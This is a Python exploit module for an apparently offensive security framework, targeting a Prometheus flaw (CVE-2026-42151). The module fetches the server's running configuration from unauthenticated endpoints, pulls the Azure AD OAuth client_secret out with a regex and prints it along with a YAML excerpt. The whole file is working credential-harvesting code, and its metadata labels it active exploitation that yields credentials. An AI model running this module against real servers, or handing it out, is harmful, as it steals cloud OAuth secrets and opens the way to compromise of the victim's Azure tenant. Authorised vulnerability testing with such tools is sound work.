#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-42151 — Prometheus Azure AD OAuth client_secret plaintext exposure."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Prometheus Azure AD Secret Disclosure (CVE-2026-42151)",
        "description": (
            "CVE-2026-42151 in Prometheus 2.48.0–3.5.2 and 3.6.0–3.11.2: OAuthConfig.ClientSecret "
            "was typed as a plain Go string instead of config_util.Secret. When Prometheus serializes "
            "its running config via /api/v1/status/config or /-/config, the real Azure AD client_secret "
            "is emitted in plaintext instead of being redacted as '<secret>'."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-42151"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42151",
            "https://www.cve.org/CVERecord?id=CVE-2026-42151",
        ],
        "tags": [
            "prometheus",
            "monitoring",
            "info-disclosure",
            "credentials",
            "azure",
            "oauth",
            "unauthenticated",
            "cve-2026-42151",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["prometheus"],
                "endpoint_pattern_any": ["/api/v1/status/config", "/-/config"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "running config YAML"},
                    {"capability": "credentials", "from_detail": "azure client_secret"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(9090, "Prometheus HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    show_config = OptBool(
        True,
        "Print an excerpt of the retrieved config YAML",
        False,
        advanced=True,
    )

    def check(self):
        base = (self.path or "/").rstrip("/")
        endpoints = [
            f"{base}/api/v1/status/config" if base else "/api/v1/status/config",
            f"{base}/-/config" if base else "/-/config",
        ]
        raw_yaml = None
        used_path = None

        for path in endpoints:
            try:
                response = self.http_request(
                    method="GET",
                    path=path,
                    allow_redirects=False,
                    timeout=int(self.timeout or 10),
                )
            except Exception as exc:
                continue
            if not response or int(response.status_code or 0) != 200:
                continue
            if "status/config" in path:
                body, err = parse_json_response(response)
                if err or not body:
                    raw_yaml = response.text or ""
                else:
                    raw_yaml = (body.get("data") or {}).get("yaml") or response.text or ""
            else:
                raw_yaml = response.text or ""
            used_path = path
            break

        if not raw_yaml:
            return {
                "vulnerable": False,
                "reason": "could not fetch config from /api/v1/status/config or /-/config",
                "confidence": "medium",
            }

        match = re.search(r"client_secret:\s*(.+)", raw_yaml)
        if not match:
            return {
                "vulnerable": False,
                "reason": "no client_secret field in config (Azure AD OAuth may not be configured)",
                "confidence": "high",
                "config_path": used_path,
                "raw_yaml": raw_yaml,
            }

        secret_value = match.group(1).strip().strip("'\"")
        if secret_value == "<secret>":
            return {
                "vulnerable": False,
                "reason": "client_secret redacted as '<secret>' — target patched",
                "confidence": "high",
                "config_path": used_path,
                "raw_yaml": raw_yaml,
            }

        return {
            "vulnerable": True,
            "reason": f"client_secret leaked in plaintext via {used_path}",
            "confidence": "high",
            "config_path": used_path,
            "client_secret": secret_value,
            "raw_yaml": raw_yaml,
        }

    def run(self):
        try:
            print_status("CVE-2026-42151 — Prometheus Azure AD client_secret disclosure")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(result.get("reason", "Target appears vulnerable"))
            print_info(f"Config source: {result.get('config_path', '?')}")

            if self.show_config:
                raw_yaml = result.get("raw_yaml") or ""
                excerpt = raw_yaml[:3000] if len(raw_yaml) > 3000 else raw_yaml
                print_info(f"Config YAML excerpt:\n{excerpt}")

            secret = result.get("client_secret") or ""
            print_success(f"Exposed client_secret: {secret}")
            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
